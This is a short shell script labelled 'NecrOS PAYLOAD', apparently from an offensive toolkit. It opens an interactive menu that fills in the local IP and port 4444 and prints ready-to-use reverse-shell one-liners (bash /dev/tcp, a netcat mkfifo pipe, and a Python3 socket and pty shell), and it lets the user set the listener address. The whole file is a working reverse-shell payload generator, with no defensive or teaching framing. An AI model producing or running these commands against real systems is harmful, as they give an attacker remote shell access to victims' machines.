#!/bin/sh
# NecrOS PAYLOAD
CYAN='\033[0;36m'
NC='\033[0m'
LHOST=$(ip addr show | grep "inet " | grep -v 127.0.0.1 | head -1 | awk '{print $2}' | cut -d/ -f1)
LPORT="4444"

while true; do
    clear
    echo "${CYAN}⚔️  FORGE ($LHOST:$LPORT)${NC}"
    echo "[1] Bash TCP"
    echo "[2] Netcat"
    echo "[3] Python3"
    echo "[4] Config"
    echo "[0] Exit"
    read -p "> " c
    case $c in
        1) echo "bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1" ;;
        2) echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $LHOST $LPORT >/tmp/f" ;;
        3) echo "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"$LHOST\",$LPORT));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")'" ;;
        4) read -p "IP: " LHOST; read -p "PORT: " LPORT ;;
        0) exit ;;
    esac
    echo ""
    read -p "Press Enter..."
done
